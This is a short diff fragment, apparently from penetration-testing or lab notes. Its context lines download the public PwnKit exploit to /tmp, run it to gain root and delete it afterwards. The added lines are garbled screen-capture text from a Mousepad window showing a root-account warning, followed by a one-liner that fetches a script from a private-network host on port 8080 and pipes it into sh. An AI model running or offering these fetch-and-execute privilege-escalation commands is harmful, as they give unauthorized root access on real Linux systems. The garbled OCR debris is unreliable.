@@ -2,3 +2,13 @@ curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o /tmp/Pwn
 chmod +x /tmp/PwnKit || exit
 (sleep 1 && rm /tmp/PwnKit & )
 /tmp/PwnKit
+
+1 2 3
+*Untitled 1-Mousepad
+192.168.45.211 11:28
+G
+000
+File Edit Search View
+Document Help
+Warning: you are using the root account. You may harm your system.
+sh -c "$(curl http://192.168.45.211:8080/PwnKit.sh)"
